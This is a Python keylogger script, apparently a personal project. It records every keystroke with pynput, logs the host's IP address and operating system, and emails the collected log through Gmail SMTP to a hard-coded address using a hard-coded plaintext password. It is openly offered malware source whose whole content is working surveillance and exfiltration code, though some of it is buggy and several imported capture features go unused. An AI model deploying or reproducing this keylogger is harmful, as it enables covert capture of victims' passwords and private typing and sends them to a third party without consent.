# Imports

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import urllib.request

import socket
import platform

# import win32clipboard, pip install pywin32

from pynput.keyboard import Key, Listener

import os
import time

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support

from PIL import ImageGrab

file_name = "logged_words.txt"

file_path = "/Users/jacobmedeiros/pycharmprojects/keyloggerproject2021/keylogger"
add_exten = "/"

count = 0
keys = []

subject = "Keylogger Information File"
body = "This email contains the retrieved information from the past 12 hours"
from_address = "KeyLoggingProject2k1"
to_address = "keyloggingproject2k1@gmail.com"
password = "Hashed@Pass$123"


def send_email(filename, attachment, to_address):
    message = MIMEMultipart()
    message["From"] = from_address
    message["To"] = to_address
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))
    filename = file_name
    attachment = open(attachment, "rb")  # open file to be sent
    p = MIMEBase('application', 'octect-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)  # encode to base64
    message.attach(p)  # attach p to message
    s = smtplib.SMTP('smtp.gmail.com', 587)  # Creates session
    s.starttls()  # Begin Transport Layer Security
    s.login(from_address, password)  # login
    text = message.as_string()  # creates message for email
    s.sendmail(from_address, to_address, text)  # send E-Mail
    s.quit()  # terminate


def get_IP():
    with open("logged_words.txt", "a") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
        f.write("HOST IP_ADDRESS:" + ip_address + "\n")
        f.write("OPERATING SYSTEM:" + platform.system() + "\n")


get_IP()


def hide_File():
    os.system("touch tester.txt")
    print(os.system("ls"))

hide_File()
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("logged_words.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

send_email(file_name, file_path + add_exten + file_name, to_address)
